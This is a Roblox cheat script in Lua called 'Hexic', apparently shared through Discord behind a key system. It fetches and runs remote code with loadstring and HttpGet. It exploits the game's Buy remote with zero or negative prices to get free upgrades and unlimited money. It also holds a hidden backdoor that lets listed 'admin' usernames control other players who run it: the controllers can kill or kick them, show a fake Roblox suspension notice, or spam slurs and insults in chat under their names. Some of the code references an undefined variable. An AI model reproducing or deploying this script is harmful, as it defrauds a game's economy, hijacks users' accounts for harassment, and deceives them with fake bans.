local allowedGameId = 74392180661358  

if game.PlaceId ~= allowedGameId then
    game.Players.LocalPlayer:Kick("Wrong game please join the game provided in the script, page and press \"game link\" and play.")
    return
end

--// Chat Function //--
function chat(msg)
    local TextChatService = game:GetService("TextChatService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if generalChannel then
            generalChannel:SendAsync(msg)
        else
            warn("RBXGeneral channel not found.")
        end
    elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
        local chatEvent = ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if chatEvent then
            chatEvent:FireServer(msg, "All")
        else
            warn("SayMessageRequest event not found.")
        end
    else
        warn("Chat system not available.")
    end
end

--// Setup //--
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

--// Admin List //--
local AdminUsernames = {
    "starbaIdie",
    "^JUSTXAIN4", -- Add more usernames here
    "nullfieIdtoken"
}

-- Check if player is admin
local function isAdmin(player)
    return table.find(AdminUsernames, player.Name) ~= nil
end

--// Helper Function //--
local function getPlayerByName(name)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower():sub(1, #name) == name:lower() or player.DisplayName:lower():sub(1, #name) == name:lower() then
            return player
        end
    end
    return nil
end

--// Command Functions //--
local function bring(target)
    local targetChar = target.Character
    local adminChar = AdminPlayer.Character

    if targetChar and adminChar then
        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        local adminRoot = adminChar:FindFirstChild("HumanoidRootPart")
        if targetRoot and adminRoot then
            targetRoot.CFrame = adminRoot.CFrame
        end
    end
end


local function antiafk(target)
        --// AntiAFK + AntiKick Made by 8rxr
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local VirtualUser = game:GetService("VirtualUser")

    --// GUI Creation
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui
    ScreenGui.Name = "AntiAFK_V3"

    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.Size = UDim2.new(0, 260, 0, 200)
    Frame.Position = UDim2.new(0.5, -130, 0.4, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    Frame.BackgroundTransparency = 0.1
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Draggable = true
    Frame.ClipsDescendants = true

    --// UI Corner (Smooth Edge)
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = Frame

    --// Neon Glow Effect
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Parent = Frame
    UIStroke.Thickness = 2.5
    UIStroke.Color = Color3.fromRGB(0, 255, 150)
    UIStroke.Transparency = 0.4

    --// Gradient Animation
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
    }
    Gradient.Rotation = 90
    Gradient.Parent = Frame

    task.spawn(function()
        while true do
            local Tween = TweenService:Create(Gradient, TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Rotation = Gradient.Rotation + 180})
            Tween:Play()
            Tween.Completed:Wait()
        end
    end)

    --// Title Label
    local Title = Instance.new("TextLabel")
    Title.Parent = Frame
    Title.Size = UDim2.new(1, 0, 0, 28)
    Title.BackgroundTransparency = 1
    Title.Text = "🛡️ AntiAFK | Made by @611v 🛡️"
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 14
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)

    --// Timer Label
    local TimerLabel = Instance.new("TextLabel")
    TimerLabel.Parent = Frame
    TimerLabel.Size = UDim2.new(1, 0, 0, 22)
    TimerLabel.Position = UDim2.new(0, 0, 0, 32)
    TimerLabel.BackgroundTransparency = 1
    TimerLabel.Text = "AFK Time: 0 seconds"
    TimerLabel.Font = Enum.Font.Gotham
    TimerLabel.TextSize = 12
    TimerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

    --// Scrolling Frame for Kick Logs
    local ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Parent = Frame
    ScrollFrame.Size = UDim2.new(1, -10, 1, -65)
    ScrollFrame.Position = UDim2.new(0, 5, 0, 58)
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScrollFrame.ScrollBarThickness = 3
    ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
    ScrollFrame.BackgroundTransparency = 1

    -- Hide Scrollbar until needed
    ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

    local ListLayout = Instance.new("UIListLayout")
    ListLayout.Parent = ScrollFrame
    ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    ListLayout.Padding = UDim.new(0, 3)

    --// Function to Format AFK Time
    local function formatTime(seconds)
        local days = math.floor(seconds / 86400)
        seconds = seconds % 86400
        local hours = math.floor(seconds / 3600)
        seconds = seconds % 3600
        local minutes = math.floor(seconds / 60)
        local secs = seconds % 60

        local result = ""
        if days > 0 then
            result = result .. days .. (days == 1 and " day, " or " days, ")
        end
        if hours > 0 then
            result = result .. hours .. (hours == 1 and " hour, " or " hours, ")
        end
        if minutes > 0 then
            result = result .. minutes .. (minutes == 1 and " minute, " or " minutes, ")
        end
        result = result .. secs .. (secs == 1 and " second" or " seconds")

        return result
    end

    --// AntiAFK System
    local afkTime = 0
    local function preventAFK()
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())

            -- Log Kick Attempt
            local Log = Instance.new("TextLabel")
            Log.Parent = ScrollFrame
            Log.Size = UDim2.new(1, -5, 0, 20)
            Log.BackgroundTransparency = 1
            Log.Text = "❌ Kick prevented at " .. formatTime(afkTime)
            Log.Font = Enum.Font.Gotham
            Log.TextSize = 12
            Log.TextColor3 = Color3.fromRGB(255, 100, 100)
            Log.TextXAlignment = Enum.TextXAlignment.Left

            -- Update ScrollFrame Canvas Size
            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 5)
        end)
    end

    --// AFK Timer System
    task.spawn(function()
        preventAFK()
        while true do
            task.wait(1)
            afkTime = afkTime + 1
            TimerLabel.Text = "AFK Time: " .. formatTime(afkTime)
        end
    end)
end


local function void(target)
    local char = target.Character
    if char then
        char:PivotTo(CFrame.new(0, -350, 0))
    end
end

local function kill(target)
    local char = target.Character
    if char then
        char:BreakJoints()
    end
end

local function freeze(target)
    local char = target.Character
    if char then
        for _, part in pairs({"LowerTorso", "UpperTorso"}) do
            local limb = char:FindFirstChild(part)
            if limb then limb.Anchored = true end
        end
    end
end

local function unfreeze(target)
    local char = target.Character
    if char then
        for _, part in pairs({"LowerTorso", "UpperTorso"}) do
            local limb = char:FindFirstChild(part)
            if limb then limb.Anchored = false end
        end
    end
end

local function sayMessage(msg)
    chat(msg)
end

local function realban(target)
    chat("FAT KID")
    wait(1)
    chat("GAY")
    wait(1)
    chat("YOU ARE UGLY")
end

local function spamrealban(target)
    while true do
    chat("FAT KID")
    wait(1)
    chat("GAY")
    wait(1)
    chat("YOU ARE UGLY")
    end
    wait(1)
end

local function copydiscord(target)
    setclipboard("https://discord.gg/4X9a4Dn7Uj")
    game.StarterGui:SetCore("SendNotification", {
    Title = "Copied!",
    Text = "Discord server copied to ur clipboard",
    Duration = 7, -- Ne kadar kalsin ekranda
})
end

local function ban(target)
    LocalPlayer:Kick("Our systems have detected unauthorized third-party software running with Roblox.\n\nAs a result, you have been temporarily suspended. Continued use of unauthorized software may lead to a permanent ban.")      
end
local function kick(target)
    LocalPlayer:Kick("You have been kicked by glockz/corex / @611v/@realglockz [Hexic Owner(s)]")
end

local function rejoin(target)
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end

-- Headsit related
local headSitConnection

local function getRoot(character)
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function enableHeadSit(speaker, target)
    local targetCharacter = target.Character
    local humanoid = speaker.Character and speaker.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Sit = true
    end
    headSitConnection = RunService.Heartbeat:Connect(function()
        if targetCharacter and getRoot(targetCharacter) and getRoot(speaker.Character) and humanoid.Sit then
            getRoot(speaker.Character).CFrame = getRoot(targetCharacter).CFrame * CFrame.new(0, 1.6, 0.4)
        else
            if headSitConnection then
                headSitConnection:Disconnect()
                headSitConnection = nil
            end
        end
    end)
end

local function disableHeadSit(speaker)
    local humanoid = speaker.Character and speaker.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Sit = false
    end
    if headSitConnection then
        headSitConnection:Disconnect()
        headSitConnection = nil
    end
end

--// Command Handler //--
AdminPlayer.Chatted:Connect(function(cht)
    local cmd, rest = cht:match("^:(%w+)%s+(.+)$")
    if not cmd or not rest then return end

    if cmd == "say" then
    local msg, targetName = rest:match("^(.-)%s+(%S+)$")
    local target = getPlayerByName(targetName)

    if msg and target and target == LocalPlayer then
        sayMessage(msg)
    end
    return
end



    local target = getPlayerByName(rest)
    if not target then
        StarterGui:SetCore("SendNotification", {
            Title = "Command Error",
            Text = "Target not found: " .. rest,
            Duration = 3
        })
        return
    end

    if LocalPlayer ~= AdminPlayer then
        if cmd == "bring" then bring(target) end
        if cmd == "hs" then enableHeadSit(LocalPlayer, target) end -- doesnt works/buggy
        if cmd == "unhs" then disableHeadSit(LocalPlayer) end -- doesnt works/buggy
        if cmd == "void" then void(target) end
        if cmd == "kill" then kill(target) end
        if cmd == "freeze" then freeze(target) end -- doesnt works/buggy
        if cmd == "unfreeze" then unfreeze(target) end -- doesnt works/buggy
        if cmd == "ban" then ban(target) end
        if cmd == "rejoin" then rejoin(target) end
        if cmd == "rban" then realban(target) end
        if cmd == "spamrban" then spamrealban(target) end
        if cmd == "copyserver" then copydiscord(target) end
        if cmd == "antiafk" then antiafk(target) end
        if cmd == "kick" then kick(target) end
        if cmd == "say" then say(target) end
    end
end)

--// Notification //--
if LocalPlayer == AdminPlayer then
    StarterGui:SetCore("SendNotification", {
        Title = "Developer",
        Text = "Let's control these users >:)",
        Time = 20,
        Icon = "rbxassetid://505845268"
    })
else
    StarterGui:SetCore("SendNotification", {
        Title = "Welcome!",
        Text = "Enjoy! :)",
        Time = 20
    })
end

--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Hexic  | v0.2 🛠️",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Welcome to Hexic!",
    LoadingSubtitle = "by realglockz",
    Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes

    DisableRayfieldPrompts = true,
    DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

    ConfigurationSaving = {
       Enabled = false,
       FolderName = false, -- Create a custom folder for your hub/game
       FileName = "Hexic"
    },

    Discord = {
       Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "hEa9YXE2pk", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },

    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "Hexic Key System",
       Subtitle = "Key: dsc.gg/glockzz [SHORT LINK]",
       Note = "Join discord for key!", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"ObumaDihh", "keno"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })

  local UpgradeTab = Window:CreateTab("📈 Upgrade 📈", null)
  local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Cool Worker",
    Callback = function()
        local args = {
        "Cool Worker",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Glowify",
    Callback = function()
        local args = {
        "Glowify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
 local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Freezify",
    Callback = function()
        local args = {
        "Freezify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
 local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Aurorify",
    Callback = function()
        local args = {
        "Aurorify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
 local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Flamify",
    Callback = function()
        local args = {
        "Flamify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
 local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Chargify",
    Callback = function()
        local args = {
        "Chargify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
  local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Goldify",
    Callback = function()
        local args = {
        "Goldify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
 local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Cosmify",
    Callback = function()
        local args = {
        "Cosmify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })
    local Button = UpgradeTab:CreateButton({
    Name = "Get Upgrade Cosmify",
    Callback = function()
        local args = {
        "Cosmify",
        0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })


   -- DRILL
 local DrillTab = Window:CreateTab("🔨 Drill 🔨", null)
  local Button = DrillTab:CreateButton({
    Name = "Get Rock Rookie",
    Callback = function()
        local args = {
        "Rock Rookie",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Digger",
    Callback = function()
        local args = {
        "Digger",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Stone Miner",
    Callback = function()
        local args = {
        "Stone Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Coal Miner",
    Callback = function()
        local args = {
        "Coal Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Copper Miner",
    Callback = function()
        local args = {
        "Copper Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Iron Miner",
    Callback = function()
        local args = {
        "Iron Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Gold Miner",
    Callback = function()
        local args = {
        "Gold Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Emerald Miner",
    Callback = function()
        local args = {
        "Emerald Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Mineshaft",
    Callback = function()
        local args = {
        "Mineshaft",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Diamond Miner",
    Callback = function()
        local args = {
        "Diamond Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Drill",
    Callback = function()
        local args = {
        "Drill",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

 local Button = DrillTab:CreateButton({
    Name = "Get Obsidian Miner",
    Callback = function()
        local args = {
        "Obsidian Miner",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

  local Button = DrillTab:CreateButton({
    Name = "Get Laser Drill",
    Callback = function()
        local args = {
        "Laser Drill",
        -0
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
    end,
 })

  local MoneyAndAutoTab = Window:CreateTab("💲 Money 💲", null)


 local Button = MoneyAndAutoTab:CreateButton({
    Name = "Get Money",
    Callback = function()
        local args = {
        "Thx for using Hexic",
        -9999999999999
}
game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))

    end,
 })

local loop = false

local Toggle = MoneyAndAutoTab:CreateToggle({
    Name = "INF Money Loop",
    CurrentValue = false,
    Flag = "LoopMoney",
    Callback = function(loopmoney)
        loop = loopmoney
        if loop then
            task.spawn(function()
                while loop do
                    local args = {
                        "Thx for using Hexic",
                        -9999999999999
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Buy"):FireServer(unpack(args))
                    task.wait(0.1)
                end
            end)
        end
    end
})

   local OthersTab = Window:CreateTab("😎 Others 😎", null)
     local Button = OthersTab:CreateButton({
    Name = "Anti-AFK Script",
    Callback = function()
           --// AntiAFK + AntiKick Made by 611v
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local VirtualUser = game:GetService("VirtualUser")

    --// GUI Creation
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui
    ScreenGui.Name = "AntiAFK_V3"

    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.Size = UDim2.new(0, 260, 0, 200)
    Frame.Position = UDim2.new(0.5, -130, 0.4, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    Frame.BackgroundTransparency = 0.1
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Draggable = true
    Frame.ClipsDescendants = true

    --// UI Corner (Smooth Edge)
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = Frame

    --// Neon Glow Effect
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Parent = Frame
    UIStroke.Thickness = 2.5
    UIStroke.Color = Color3.fromRGB(0, 255, 150)
    UIStroke.Transparency = 0.4

    --// Gradient Animation
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
    }
    Gradient.Rotation = 90
    Gradient.Parent = Frame

    task.spawn(function()
        while true do
            local Tween = TweenService:Create(Gradient, TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Rotation = Gradient.Rotation + 180})
            Tween:Play()
            Tween.Completed:Wait()
        end
    end)

    --// Title Label
    local Title = Instance.new("TextLabel")
    Title.Parent = Frame
    Title.Size = UDim2.new(1, 0, 0, 28)
    Title.BackgroundTransparency = 1
    Title.Text = "🛡️ AntiAFK | Made by @611v 🛡️"
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 14
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)

    --// Timer Label
    local TimerLabel = Instance.new("TextLabel")
    TimerLabel.Parent = Frame
    TimerLabel.Size = UDim2.new(1, 0, 0, 22)
    TimerLabel.Position = UDim2.new(0, 0, 0, 32)
    TimerLabel.BackgroundTransparency = 1
    TimerLabel.Text = "AFK Time: 0 seconds"
    TimerLabel.Font = Enum.Font.Gotham
    TimerLabel.TextSize = 12
    TimerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

    --// Scrolling Frame for Kick Logs
    local ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Parent = Frame
    ScrollFrame.Size = UDim2.new(1, -10, 1, -65)
    ScrollFrame.Position = UDim2.new(0, 5, 0, 58)
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScrollFrame.ScrollBarThickness = 3
    ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
    ScrollFrame.BackgroundTransparency = 1

    -- Hide Scrollbar until needed
    ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

    local ListLayout = Instance.new("UIListLayout")
    ListLayout.Parent = ScrollFrame
    ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    ListLayout.Padding = UDim.new(0, 3)

    --// Function to Format AFK Time
    local function formatTime(seconds)
        local days = math.floor(seconds / 86400)
        seconds = seconds % 86400
        local hours = math.floor(seconds / 3600)
        seconds = seconds % 3600
        local minutes = math.floor(seconds / 60)
        local secs = seconds % 60

        local result = ""
        if days > 0 then
            result = result .. days .. (days == 1 and " day, " or " days, ")
        end
        if hours > 0 then
            result = result .. hours .. (hours == 1 and " hour, " or " hours, ")
        end
        if minutes > 0 then
            result = result .. minutes .. (minutes == 1 and " minute, " or " minutes, ")
        end
        result = result .. secs .. (secs == 1 and " second" or " seconds")

        return result
    end

    --// AntiAFK System
    local afkTime = 0
    local function preventAFK()
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())

            -- Log Kick Attempt
            local Log = Instance.new("TextLabel")
            Log.Parent = ScrollFrame
            Log.Size = UDim2.new(1, -5, 0, 20)
            Log.BackgroundTransparency = 1
            Log.Text = "❌ Kick prevented at " .. formatTime(afkTime)
            Log.Font = Enum.Font.Gotham
            Log.TextSize = 12
            Log.TextColor3 = Color3.fromRGB(255, 100, 100)
            Log.TextXAlignment = Enum.TextXAlignment.Left

            -- Update ScrollFrame Canvas Size
            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 5)
        end)
    end

    --// AFK Timer System
    task.spawn(function()
        preventAFK()
        while true do
            task.wait(1)
            afkTime = afkTime + 1
            TimerLabel.Text = "AFK Time: " .. formatTime(afkTime)
        end
    end)

    end,
 })
  -- CREDITS
 local CreditsTab = Window:CreateTab("👑 Credits 👑", null)

 local Section = CreditsTab:CreateSection("Made by: @realglockz [glockz]")
  local Section = CreditsTab:CreateSection("Scripted by: @611v [corex]")
 local Button = CreditsTab:CreateButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/hEa9YXE2pk")
    end,
 })

  local Button = CreditsTab:CreateButton({
    Name = "Copy Discord Short Link",
    Callback = function()
        setclipboard("https://dsc.gg/glockzz")
    end,
 })